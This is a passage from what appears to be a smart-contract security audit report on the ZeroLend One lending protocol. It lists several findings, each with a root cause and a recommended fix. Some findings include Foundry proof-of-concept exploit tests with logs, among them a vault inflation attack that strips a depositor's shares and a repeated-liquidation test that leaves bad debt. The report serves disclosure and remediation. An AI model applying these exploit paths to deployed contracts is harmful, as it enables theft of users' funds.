            uint256 ratioAfterFirstLiquidation = debtAfterFirstLiquidation*1e18/collAfterFirstLiquidation;
            console.log("bad debt: %s", collAfterFirstLiquidation < debtAfterFirstLiquidation);
            console.log("d / c < .95 => %e / %e = %e", debtAfterFirstLiquidation,collAfterFirstLiquidation, ratioAfterFirstLiquidation);
            console.log("ratio < 0.95 => %e < %e => %s", ratioAfterFirstLiquidation, 0.95e18, ratioAfterFirstLiquidation < 0.95e18);

            console.log("alice HF after first liquidation: %e", healthFactorAfterFirstLiquidation);
            console.log("Total amount liquidated: %e\n", balanceAfterFirstLiquidation-balanceBefore);
    }

    {
            pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10000e18);
            uint256 balanceAfterSecondLiquidation = tokenA.balanceOf(bob);
            (uint256 collAfterSecondLiquidation,uint256 debtAfterSecondLiquidation,,,,uint256 healthFactorAfterSecondLiquidation) = pool.getUserAccountData(address(nftPositionManager), 1);
            uint256 ratioAfterSecondLiquidation = debtAfterSecondLiquidation*1e18/collAfterSecondLiquidation;
            console.log("bad debt: %s", collAfterSecondLiquidation < debtAfterSecondLiquidation);
            console.log("d / c < .95 => %e / %e = %e", debtAfterSecondLiquidation,collAfterSecondLiquidation, ratioAfterSecondLiquidation);
            console.log("ratio < 0.95 => %e < %e => %s", ratioAfterSecondLiquidation, 0.95e18, ratioAfterSecondLiquidation < 0.95e18);

            console.log("alice HF after second liquidation: %e", healthFactorAfterSecondLiquidation);
            console.log("Total amount liquidated: %e\n", balanceAfterSecondLiquidation-balanceBefore);
     }

    {
            pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10000e18);
            uint256 balanceAfterThirdLiquidation = tokenA.balanceOf(bob);
            (uint256 collAfterThirdLiquidation,uint256 debtAfterThirdLiquidation,,,,uint256 healthFactorAfterThirdLiquidation) = pool.getUserAccountData(address(nftPositionManager), 1);
            uint256 ratioAfterThirdLiquidation = debtAfterThirdLiquidation*1e18/collAfterThirdLiquidation;
            console.log("bad debt: %s", collAfterThirdLiquidation < debtAfterThirdLiquidation);
            console.log("d / c < .95 => %e / %e = %e", debtAfterThirdLiquidation,collAfterThirdLiquidation, ratioAfterThirdLiquidation);
            console.log("ratio < 0.95 => %e < %e => %s", ratioAfterThirdLiquidation, 0.95e18, ratioAfterThirdLiquidation < 0.95e18);

            console.log("alice HF after second liquidation: %e", healthFactorAfterThirdLiquidation);
            console.log("Total amount liquidated: %e\n", balanceAfterThirdLiquidation-balanceBefore);
    }
    vm.stopPrank();
  }
```

Logs: 
  d / c < .95 => 7.5e10 / 7.8e10 = 9.61538461538461538e17
  ratio < 0.95 => 9.61538461538461538e17 < 9.5e17 => false
  alice HF before any liquidations: 9.88e17

  bad debt: false
  d / c < .95 => 3.75e10 / 3.8625e10 = 9.7087378640776699e17
  ratio < 0.95 => 9.7087378640776699e17 < 9.5e17 => false
  alice HF after first liquidation: 9.785e17
  Total amount liquidated: 5.04807692307692307692e20

  bad debt: false
  d / c < .95 => 1.875e10 / 1.89375e10 = 9.90099009900990099e17
  ratio < 0.95 => 9.90099009900990099e17 < 9.5e17 => false
  alice HF after second liquidation: 9.595e17
  Total amount liquidated: 7.57211538461538461538e20

  bad debt: true
  d / c < .95 => 9.375e9 / 9.09375e9 = 1.030927835051546391e18
  ratio < 0.95 => 1.030927835051546391e18 < 9.5e17 => false
  alice HF after second liquidation: 9.215e17
  Total amount liquidated: 8.8341346153846153846e20

The test shows how after subsequent liquidations, the health factor fails to improve after several liquidations. The position is both unhealthier after each liquidation, and the user is being liquidated beyond 50% of their debt when their ```HF > 0.95```. Eventually, after the 3rd liquidation the protocol is left with bad debt (collateral < debt)
 
### Mitigation

Do not allow partial liquidations when the inequality is unfavorable. Consider disallowing liquidations if they decrease the health factor.

# Issue H-10: Function `executeMintToTreasury` will incorrectly reduce the `supplyShares`, therefore prevent the last users  from withdrawing 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/375 

## Found by 
000000, 0xAlix2, 0xc0ffEE, A2-security, Honour, KupiaSec, Nihavent, Obsidian, Tendency, Valy001, Varun\_05, coffiasd, ether\_sky, iamnmt, imsrybr0, lemonmon, silver\_eth, stuart\_the\_minion, trachev
### Summary

The incorrect reduction in `PoolLogic::executeMintToTreasury` will cause failure of some (likely to be the last) user's withdrawal, and the fund will be locked.

### Root Cause

The `totalSupply.supplyShares` is supposed to be the sum of `balances.supplyShares`, as they are always updated in tandem: 

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol#L94-L95
https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol#L48-L49

If this is not held, then some users will not be able to withdraw their collateral, as the `totalSupply.supplyShares` will underflow and revert. 

However in the `PoolLogic::executeMintToTreasury` updates the `totalSupply.supplyShares` without updating any user's balance. It is because it incorrectly assumes that there is share to be burned, even though the accrued amount was never really minted to the treasury (in that the treasury's share balance was not added). If it is so, that share should be burned from the treasury.

Also, for example, when premium is added via flashloan, the premium is counted as underlyingBalance: https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/FlashLoanLogic.sol#L118

Therefore, when the underlying asset is transferred out via `executeMintToTreasury`, the `underlyingBalance` should be updated accordingly.


### Internal pre-conditions

Non-zero `accruedToTreasuryShares`


### External pre-conditions

_No response_

### Attack Path

1. Anybody calls `withdraw` or `withdrawSimple`, it will reduce the `asset`'s `totalSupply.supplyShares` incorrectly.

### impact

The last user(s) who is trying to withdraw will fail, and their fund will be locked


### PoC

_No response_

### Mitigation

Suggestion of mitigation:


```solidity
// PoolLogic.sol
  function executeMintToTreasury(
    DataTypes.ReserveSupplies storage totalSupply,
    mapping(address => DataTypes.ReserveData) storage reservesData,
    address treasury,
    address asset
  ) external {
    DataTypes.ReserveData storage reserve = reservesData[asset];

    uint256 accruedToTreasuryShares = reserve.accruedToTreasuryShares;

    if (accruedToTreasuryShares != 0) {
      reserve.accruedToTreasuryShares = 0;
      uint256 normalizedIncome = reserve.getNormalizedIncome();
      uint256 amountToMint = accruedToTreasuryShares.rayMul(normalizedIncome);

      IERC20(asset).safeTransfer(treasury, amountToMint);
-     totalSupply.supplyShares -= accruedToTreasuryShares;
+     totalSupply.underlyingBalance -= amountToMint;

      emit PoolEventsLib.MintedToTreasury(asset, amountToMint);
    }
  }
```


# Issue H-11: Interest rate is updated before updating the debt when repaying debt 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/413 

## Found by 
000000, 0xweebad, A2-security, JCN, Obsidian, Tendency, TessKimy, Varun\_05, almurhasan, dhank, ether\_sky, imsrybr0, lemonmon, stuart\_the\_minion, trachev
### Summary

Interest rate is updated before updating the debt when repaying debt in `BorrowLogic@executeRepay` leading to an incorrect total debt being used when calculating the new interest rates and causing suppliers to keep accruing interest based on the previous debt and even if there are no ongoing borrows anymore.

### Root Cause

[BorrowLogic](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L117-L161)
```solidity
  function executeRepay(
    DataTypes.ReserveData storage reserve,
    DataTypes.PositionBalance storage balances,
    DataTypes.ReserveSupplies storage totalSupplies,
    DataTypes.UserConfigurationMap storage userConfig,
    DataTypes.ExecuteRepayParams memory params
  ) external returns (DataTypes.SharesType memory payback) {
    DataTypes.ReserveCache memory cache = reserve.cache(totalSupplies);
    reserve.updateState(params.reserveFactor, cache);
    payback.assets = balances.getDebtBalance(cache.nextBorrowIndex);

    // Allows a user to max repay without leaving dust from interest.
    if (params.amount == type(uint256).max) {
      params.amount = payback.assets;
    }

    ValidationLogic.validateRepay(params.amount, payback.assets);

    // If paybackAmount is more than what the user wants to payback, the set it to the
    // user input (ie params.amount)
    if (params.amount < payback.assets) payback.assets = params.amount;

    reserve.updateInterestRates( // <==== Audit
      totalSupplies,
      cache,
      params.asset,
      IPool(params.pool).getReserveFactor(),
      payback.assets,
      0,
      params.position,
      params.data.interestRateData
    );

    // update balances and total supplies
    payback.shares = balances.repayDebt(totalSupplies, payback.assets, cache.nextBorrowIndex); // <==== Audit
    cache.nextDebtShares = totalSupplies.debtShares; // <==== Audit

    if (balances.getDebtBalance(cache.nextBorrowIndex) == 0) {
      userConfig.setBorrowing(reserve.id, false);
    }

    IERC20(params.asset).safeTransferFrom(msg.sender, address(this), payback.assets);
    emit PoolEventsLib.Repay(params.asset, params.position, msg.sender, payback.assets);
  }
```

[ReserveLogic](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L145-L182)
```solidity
  function updateInterestRates(
    DataTypes.ReserveData storage _reserve,
    DataTypes.ReserveSupplies storage totalSupplies,
    DataTypes.ReserveCache memory _cache,
    address _reserveAddress,
    uint256 _reserveFactor,
    uint256 _liquidityAdded,
    uint256 _liquidityTaken,
    bytes32 _position,
    bytes memory _data
  ) internal {
    UpdateInterestRatesLocalVars memory vars;

    vars.totalDebt = _cache.nextDebtShares.rayMul(_cache.nextBorrowIndex); // <==== Audit

    (vars.nextLiquidityRate, vars.nextBorrowRate) = IReserveInterestRateStrategy(_reserve.interestRateStrategyAddress)
      .calculateInterestRates(
      _position,
      _data,
      DataTypes.CalculateInterestRatesParams({
        liquidityAdded: _liquidityAdded, // <==== Audit
        liquidityTaken: _liquidityTaken,
        totalDebt: vars.totalDebt, // <==== Audit
        reserveFactor: _reserveFactor,
        reserve: _reserveAddress
      })
    );

    _reserve.liquidityRate = vars.nextLiquidityRate.toUint128();
    _reserve.borrowRate = vars.nextBorrowRate.toUint128();

    if (_liquidityAdded > 0) totalSupplies.underlyingBalance += _liquidityAdded.toUint128();
    else if (_liquidityTaken > 0) totalSupplies.underlyingBalance -= _liquidityTaken.toUint128();

    emit PoolEventsLib.ReserveDataUpdated(
      _reserveAddress, vars.nextLiquidityRate, vars.nextBorrowRate, _cache.nextLiquidityIndex, _cache.nextBorrowIndex
    );
  }
```

Interest rate is updated before repaying the debt and updating the cached `nextDebtShares` which is then used in the interest rate calculation causing it to return a wrong interest rate as it behaves like liquidity was just supplied by the borrower without a change in debt.

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

1. Bob supplies `tokenB`
2. Alice supplies `tokenA`
3. Alice borrows `tokenB` causing the utilization goes up and interest rate is updated
4. Bob starts accruing interest
5. Alice fully repays `tokenB` but the interest rate is not updated correctly
6. Bob keeps accruing interest

### Impact

Bob keeps accruing interest rate based on the previous debt and even if there are no ongoing borrows and can withdraw it at the expense of other suppliers.

### PoC

```solidity
  function testRepay() external {
    _mintAndApprove(alice, tokenA, 3000 ether, address(pool));
    _mintAndApprove(alice, tokenB, 1000 ether, address(pool));
    _mintAndApprove(bob, tokenB, 5000 ether, address(pool));

    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, 500 ether, 0);

    skip(12);
    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, 1000 ether, 0);

    skip(12);
    oracleA.updateRoundTimestamp();
    oracleB.updateRoundTimestamp();
    pool.borrowSimple(address(tokenB), alice, 375 ether, 0);

    skip(12);
    pool.repaySimple(address(tokenB), type(uint256).max, 0);

    vm.stopPrank();

    bytes32 bobPos = keccak256(abi.encodePacked(bob, 'index', uint256(0)));
    uint256 bobSupplyAssetsBefore = pool.supplyAssets(address(tokenB), bobPos);

    skip(24 * 30 * 60 * 60);

    pool.forceUpdateReserve(address(tokenB));

    assertGt(pool.supplyAssets(address(tokenB), bobPos), bobSupplyAssetsBefore); // Bob accrued interest even if there are no borrows anymore

    vm.startPrank(bob);
    // Reverts because Bob shares with the accrued interest exceed the pool balance but
    // succeed if there were other suppliers.
    vm.expectRevert();
    pool.withdrawSimple(address(tokenB), bob, type(uint256).max, 0);

    vm.stopPrank();
  }
```

### Mitigation

```diff
diff --git a/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol b/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol
index 92806b1..c070fb1 100644
--- a/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol
+++ b/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol
@@ -136,6 +136,14 @@ library BorrowLogic {
     // user input (ie params.amount)
     if (params.amount < payback.assets) payback.assets = params.amount;

+    // update balances and total supplies
+    payback.shares = balances.repayDebt(totalSupplies, payback.assets, cache.nextBorrowIndex);
+    cache.nextDebtShares = totalSupplies.debtShares;
+
+    if (balances.getDebtBalance(cache.nextBorrowIndex) == 0) {
+      userConfig.setBorrowing(reserve.id, false);
+    }
+
     reserve.updateInterestRates(
       totalSupplies,
       cache,
@@ -147,14 +155,6 @@ library BorrowLogic {
       params.data.interestRateData
     );

-    // update balances and total supplies
-    payback.shares = balances.repayDebt(totalSupplies, payback.assets, cache.nextBorrowIndex);
-    cache.nextDebtShares = totalSupplies.debtShares;
-
-    if (balances.getDebtBalance(cache.nextBorrowIndex) == 0) {
-      userConfig.setBorrowing(reserve.id, false);
-    }
-
     IERC20(params.asset).safeTransferFrom(msg.sender, address(this), payback.assets);
     emit PoolEventsLib.Repay(params.asset, params.position, msg.sender, payback.assets);
   }
```

# Issue H-12: Wrong calculation of supply/debt balance of a position, disrupting core system functionalities 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473 

## Found by 
000000, 0xAlix2, A2-security, BiasedMerc, Bigsam, Honour, JCN, JuggerNaut63, KupiaSec, Nihavent, Obsidian, Tendency, TessKimy, Varun\_05, almurhasan, charlesjhongc, dany.armstrong90, denzi\_, dhank, ether\_sky, iamnmt, jah, joshuajee, lemonmon, neon2835, oxelmiguel, perseus, silver\_eth, trachev, uint6
## Summary
There is an error in the calculation of the supply/debt balance of a position, impacting a wide range of operations across the system, including core lending features.

## Vulnerability Detail
`PositionBalanceConfiguration` library have 2 methods to provide supply/debt balance of a position as follows:

```solidity
  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {
    uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);
>   return self.supplyShares + increase;
  }

  function getDebtBalance(DataTypes.PositionBalance storage self, uint256 index) internal view returns (uint256 debt) {
    uint256 increase = self.debtShares.rayMul(index) - self.debtShares.rayMul(self.lastDebtLiquidtyIndex);
>   return self.debtShares + increase;
  }
```

The implementation contains a critical error as it returns the `share amount` rather than the `asset amount` held. This issue is evident when the function utilizes `index`, same as `self.lastSupplyLiquidityIndex` or `self.lastDebtLiquidityIndex`. Each function returns `self.supplyShares` and `self.debtShares`, which are share amounts, while the caller expects accurate asset balances. A similar issue occurs when a different index is used, still resulting in an incorrect balance that is significantly lower than the actual balance.

Below I provide a sample scenario to check supply balance (`getSupplyBalance` using same liquidity index):
1. Suppose `position.lastSupplyLiquidtyIndex` = `2 RAY` (2e27)  (Time passed as the liquidity increased).
2. Now position is supplied `2 RAY` of assets, it got `1 RAY` (2RAY.rayDiv(2RAY)) shares minted.
3. Then `position.getSupplyBalance(2 RAY)` returns `1 RAY` while we expect `2 RAY` which is correct balance.

Below is a foundary PoC to validate one live example: failure to fully repay with type(uint256).max due to balance error. Full script can be found [here](https://gist.github.com/worca333/8103ca8527e918b4fc8ab06b71ac798a).
```solidity
  function testRepayFailWithUint256MAX() external {
    _mintAndApprove(alice, tokenA, 4000 ether, address(pool));

    // Set the reserve factor to 1000 bp (10%)
    poolFactory.setReserveFactor(10_000);

    // Alice supplies and borrows tokenA from the pool
    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, 2000 ether, 0);
    pool.borrowSimple(address(tokenA), alice, 800 ether, 0);

    vm.warp(block.timestamp + 10 minutes);

    assertGt(pool.getDebt(address(tokenA), alice, 0), 0);
    vm.stopPrank();

    // borrow again: this will update reserve.lastDebtLiquidtyIndex
    vm.startPrank(alice);
    pool.borrowSimple(address(tokenA), alice, 20 ether, 0);
    vm.stopPrank();

    pool.forceUpdateReserve(address(tokenA));

    console.log("Debt before repay: ", pool.getDebt(address(tokenA), alice, 0));
    vm.startPrank(alice);
    tokenA.approve(address(pool), UINT256_MAX);
    pool.repaySimple(address(tokenA), UINT256_MAX, 0);
    console.log("Debt after  repay: ", pool.getDebt(address(tokenA), alice, 0));

    console.log("Assert: Debt still exists after full-repay with UINT256_MAX");
    assertNotEq(pool.getDebt(address(tokenA), alice, 0), 0);
    vm.stopPrank();
  }
```

Run the test by 
```bash
forge test --mt testRepayFailWithUint256MAX -vvv
```

Logs:
```bash
[PASS] testRepayFailWithUint256MAX() (gas: 567091)
Logs:
  Debt before repay:  819999977330884982376
  Debt after  repay:  929433690028148
  Assert: Debt still exists after full-repay with UINT256_MAX

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.68ms (1.18ms CPU time)

Ran 1 test suite in 281.17ms (4.68ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact
Since these functions are integral to the core pool/position logic and are utilized extensively across the system, the impacts are substantial.
1. In `SupplyLogic.executeWithdraw`, withdrawl is processed based on wrong position supply balance which potentially could fail.
```solidity
  function executeWithdraw(
    ...
  ) external returns (DataTypes.SharesType memory burnt) {
    DataTypes.ReserveData storage reserve = reservesData[params.asset];
    DataTypes.ReserveCache memory cache = reserve.cache(totalSupplies);
    reserve.updateState(params.reserveFactor, cache);

>   uint256 balance = balances[params.asset][params.position].getSupplyBalance(cache.nextLiquidityIndex);
    ...
```

2. In `BorrowLogic.executeRepay`, it would fail
  - to do full-repay because `payback.assets` is not the total debt amount
  - to do `setBorrwing(reserve.id, false)` because `getDebtBalance` almost unlikely goes 0, as it can't do full repay
```solidity
  function executeRepay(
    ...
  ) external returns (DataTypes.SharesType memory payback) {
    DataTypes.ReserveCache memory cache = reserve.cache(totalSupplies);
    reserve.updateState(params.reserveFactor, cache);
>   payback.assets = balances.getDebtBalance(cache.nextBorrowIndex);

    // Allows a user to max repay without leaving dust from interest.
    if (params.amount == type(uint256).max) {
>     params.amount = payback.assets;
    }

    ...

>   if (balances.getDebtBalance(cache.nextBorrowIndex) == 0) {
      userConfig.setBorrowing(reserve.id, false);
    }

    IERC20(params.asset).safeTransferFrom(msg.sender, address(this), payback.assets);
    emit PoolEventsLib.Repay(params.asset, params.position, msg.sender, payback.assets);
  }
```

3. In `NFTPositionManagerSetter._supply` and `NFTPositionManagerSetter._borrow`, they call `NFTRewardsDistributor._handleSupplies` and `NFTRewardsDistributor._handleDebt` with wrong balance amounts which would lead to incorrect reward distribution.
```solidity
  function _supply(AssetOperationParams memory params) internal nonReentrant {
    if (params.amount == 0) revert NFTErrorsLib.ZeroValueNotAllowed();
    if (params.tokenId == 0) {
      if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();
      params.tokenId = _nextId - 1;
    }

    IPool pool = IPool(_positions[params.tokenId].pool);

    IERC20(params.asset).forceApprove(address(pool), params.amount);
    pool.supply(params.asset, address(this), params.amount, params.tokenId, params.data);

    // update incentives
>   uint256 balance = pool.getBalance(params.asset, address(this), params.tokenId);
    _handleSupplies(address(pool), params.asset, params.tokenId, balance);

    emit NFTEventsLib.Supply(params.asset, params.tokenId, params.amount);
  }

  function _borrow(AssetOperationParams memory params) internal nonReentrant {
    if (params.target == address(0)) revert NFTErrorsLib.ZeroAddressNotAllowed();
    if (params.amount == 0) revert NFTErrorsLib.ZeroValueNotAllowed();
    if (params.tokenId == 0) {
      if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();
      params.tokenId = _nextId - 1;
    }

    // check permissions
    _isAuthorizedForToken(params.tokenId);

    IPool pool = IPool(_positions[params.tokenId].pool);
    pool.borrow(params.asset, params.target, params.amount, params.tokenId, params.data);

    // update incentives
>   uint256 balance = pool.getDebt(params.asset, address(this), params.tokenId);
    _handleDebt(address(pool), params.asset, params.tokenId, balance);

    emit NFTEventsLib.Borrow(params.asset, params.amount, params.tokenId);
  }
```

4. In `NFTPositionManagerSetter._repay`, wrong balance is used to estimate debt status and refunds.
  - It will almost likely revert with `NFTErrorsLib.BalanceMisMatch` because `debtBalance` is share amount versus `repaid.assets` is asset amount
  - `currentDebtBalance` will never go 0 because it almost unlikely gets repaid in full, hence refund never happens
  - `_handleDebt` would work wrongly due to incorrect balance 
```solidity
  function _repay(AssetOperationParams memory params) internal nonReentrant {
    ...
>   uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);
    DataTypes.SharesType memory repaid = pool.repay(params.asset, params.amount, params.tokenId, params.data);
>   uint256 currentDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);

    if (previousDebtBalance - currentDebtBalance != repaid.assets) {
      revert NFTErrorsLib.BalanceMisMatch();
    }

    if (currentDebtBalance == 0 && repaid.assets < params.amount) {
      asset.safeTransfer(msg.sender, params.amount - repaid.assets);
    }

    // update incentives
    _handleDebt(address(pool), params.asset, params.tokenId, currentDebtBalance);

    emit NFTEventsLib.Repay(params.asset, params.amount, params.tokenId);
  }
```

5. In `CuratedVault.totalAssets`, it returns wrong asset amount.
```solidity
  function totalAssets() public view override returns (uint256 assets) {
    for (uint256 i; i < withdrawQueue.length; ++i) {
>     assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);
    }
  }
```

## Code Snippet
https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol#L126-L140

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L118

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L126

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L44-L82

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L119-L121

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVault.sol#L368-L372

## Tool used
Manual Review, Foundary

## Recommendation
The `getSupplyBalance` and `getDebtBalance` functions need an update to accurately reflect the balance. Referring to `getSupplyBalance` and `getDebtBalance` functions from `ReserveSuppliesConfiguration`, we can make updates as following:

```diff
  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {
-   uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);
-   return self.supplyShares + increase;
+   return self.supplyShares.rayMul(index);
  }

  function getDebtBalance(DataTypes.PositionBalance storage self, uint256 index) internal view returns (uint256 debt) {
-   uint256 increase = self.debtShares.rayMul(index) - self.debtShares.rayMul(self.lastDebtLiquidtyIndex);
-   return self.debtShares + increase;
+   return self.debtShares.rayMul(index);
  }
```

# Issue M-1: Using the same heartbeat for multiple price feeds, causing DOS 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/9 

## Found by 
000000, 0xAlix2, 0xAristos, 0xDemon, 0xMax1mus, 0xlrivo, A2-security, Bauchibred, EgisSecurity, HackTrace, Honour, Obsidian, aman, emmac002, iamnmt, perseus, sheep, theweb3mechanic, zarkk01
### Summary

Chainlink price feeds usually update the price of an asset once it deviates a certain percentage. For example the ETH/USD price feed updates on 0.5% change of price. If there is no change for 1 hour, the price feed updates again - this is called heartbeat: https://data.chain.link/feeds/ethereum/mainnet/eth-usd.

According to the docs, the protocol should be compatible with any EVM-compatible chain. On the other hand, different chains use different heartbeats for the same assets.

Different chains have different heartbeats:

USDT/USD:
* Linea: ~24 hours, https://data.chain.link/feeds/linea/mainnet/usdt-usd
* Polygon: ~27 seconds, https://data.chain.link/feeds/polygon/mainnet/usdt-usd

BNB/USD:
* Ethereum: ~24 hours, https://data.chain.link/feeds/ethereum/mainnet/bnb-usd
* Optimism: ~20 minutes, https://data.chain.link/feeds/optimism/mainnet/bnb-usd

In [`PoolGetters::getAssetPrice`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/PoolGetters.sol#L158C12-L163), the protocol is using the same heartbeat for all assets/chains, which is 30 minutes.

This causes the protocol to regularly revert unexpectedly (DOS).

### Root Cause

The same heartbeat is being used for all chains/assets, in `PoolGetters::getAssetPrice`.

### Impact

Either constant downtime leading to transactions reverting or insufficient staleness checks leading to the possibility of the old price.

### PoC

1. User calls `withdraw`, to withdraw his collateral (in USDT) from a certain pool on Linea
2. The `withdraw` function calls other multiple functions leading to `GenericLogic::calculateUserAccountData` (which gets the price of an asset)
3. The contract calls the Oracle USDT/USD feed on Linea
4. At the moment the heartbeat check for every price feed on every chain is set to 30 minutes
5. The price was not updated for more than 2 hours since the heartbeat for the pair is 24 hours and also not changed 1% in either direction
6. The transaction reverts causing DoS

### Mitigation

Introduce a new parameter that could be passed alongside the oracle which refers to the heartbeat of that oracle, so that `updatedAt` could be compared with that value.

# Issue M-2: CuratedVaults are prone to inflation attacks due to not utilising virtual shares 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/141 

## Found by 
0xMax1mus, A2-security, Bauchibred, BiasedMerc, Jigsaw, Oblivionis, Obsidian, TessKimy, iamnmt
## Summary
An attacker can frontrun a user's deposit transaction in a new vault pool position, stealing 100% of the depositors underlying token deposit by causing no shares to be minted to the user. This is caused by inflating the value of the shares to cause the user's underlying token deposit amount to round down to be worth 0 shares.

## Vulnerability Detail
[SharesMathLib.sol](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/libraries/SharesMathLib.sol#L32-L36)
```solidity
library SharesMathLib {
  using MathLib for uint256;
...SKIP...
  uint256 internal constant VIRTUAL_SHARES = 0;
...SKIP...
  uint256 internal constant VIRTUAL_ASSETS = 0;
  ```

The [morpho version](https://github.com/morpho-org/morpho-blue/blob/731e3f7ed97cf15f8fe00b86e4be5365eb3802ac/src/libraries/SharesMathLib.sol) that this code is based on has these values set to non-zero, which allows them to be protected against vault inflation attacks. However ZeroLend One has these values set to `0` meaning the vault inflation protection are not in place.

## POC
<details>
<summary>POC</summary>
Add the following code to the bottom of `IntegrationVaultTest::_setUpVault()`:

```solidity
    vm.startPrank(attacker);
    loanToken.approve(address(vault), type(uint256).max);
    collateralToken.approve(address(vault), type(uint256).max);
    vm.stopPrank();

    // ERC4626Test context address, as vm.startPrank does not change the context msg.sender in the test file
    vm.startPrank(0x50EEf481cae4250d252Ae577A09bF514f224C6C4);
    loanToken.approve(0xC8011cB77CC747B5F30bAD583eABfb522Be25712, type(uint256).max); // market where we will be sending donation
    collateralToken.approve(0xC8011cB77CC747B5F30bAD583eABfb522Be25712, type(uint256).max);
    vm.stopPrank();
```

Declare the attacker address in `BaseVaultTest.sol` contract under the other addresses:

```solidity
address internal attacker = makeAddr('attacker');
```

Add the following function to `ERC4626Test.sol`:
```solidity
  function testVaultInflationAttack() public {
    uint256 attackerAssets = 1e18+1;
    uint256 attackerDonation = 1e18;
    uint256 supplierAssets = 1e18;

    loanToken.mint(attacker, attackerAssets);
    loanToken.mint(supplier, supplierAssets);

    /// attacker front-run supplier
    loanToken.mint(0x50EEf481cae4250d252Ae577A09bF514f224C6C4, attackerDonation); // ERC4626Test context will perform the donation as vm.startPrank isn't changing msg.sender to attacker
    allMarkets[0].supplySimple(address(loanToken), address(vault), attackerDonation, 0); // supply vault market position
    console.log("attacker donates assets:", attackerDonation);

    vm.prank(attacker);
    uint256 attackerShares = vault.deposit(attackerAssets, attacker);
    console.log("attacker deposits underlying:", attackerAssets);
    console.log("attacker shares:", attackerShares);
    loanToken.mint(address(vault), 1e18); // same as attacker transfering, but having issue with foundry
    // attacker donation
    
    /// supplier deposit transaction
    vm.prank(supplier);
    uint256 supplierShares = vault.deposit(supplierAssets, supplier);
    console.log("supplier deposits underlying:", supplierAssets);
    console.log("supplier shares:", supplierShares);

    console.log("vault underlying:", vault.totalAssets());
    console.log("vault shares:", vault.totalSupply());
  }
```
</details>

```solidity
Logs:
  attacker donates assets: 1000000000000000000
  attacker deposits underlying: 1000000000000000001
  attacker shares: 1
  supplier deposits underlying: 1000000000000000000
  supplier shares: 0
  vault underlying: 3000000000000000001
  vault shares: 1
```

## Impact

As seen from the POC logs the depositor is minted 0 shares, and the attacker controls the singular share of the vault allowing them to redeem the share and get back their `2e18+1` attack funds and `1e18` of the supplier's funds. This is a clear loss of funds due to an inflation attack, leading to a High risk vulnerability as each vault will be vulnerable to this risk due to not utilising the Morpho vault inflation protections.

## Code Snippet

[SharesMathLib.sol](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/libraries/SharesMathLib.sol#L32-L36)

## Tool used

Foundry and Manual Review

## Recommendation

Utilise the same values as Morpho for `VIRTUAL_SHARES` and `VIRTUAL_ASSETS`:
```solidity
library SharesMathLib {
    using MathLib for uint256;

    /// @dev The number of virtual shares has been chosen low enough to prevent overflows, and high enough to ensure
    /// high precision computations.
    /// @dev Virtual shares can never be redeemed for the assets they are entitled to, but it is assumed the share price
    /// stays low enough not to inflate these assets to a significant value.
    /// @dev Warning: The assets to which virtual borrow shares are entitled behave like unrealizable bad debt.
    uint256 internal constant VIRTUAL_SHARES = 1e6;

    /// @dev A number of virtual assets of 1 enforces a conversion rate between shares and assets when a market is
    /// empty.
    uint256 internal constant VIRTUAL_ASSETS = 1;
```



## Discussion

**sherlock-admin4**

1 comment(s) were left on this issue during the judging contest.

**Honour** commented:
>  Invalid: misleading POC. Intentionally doesn't show attackers profit as it results in a loss of funds for attacker as well



**nevillehuang**

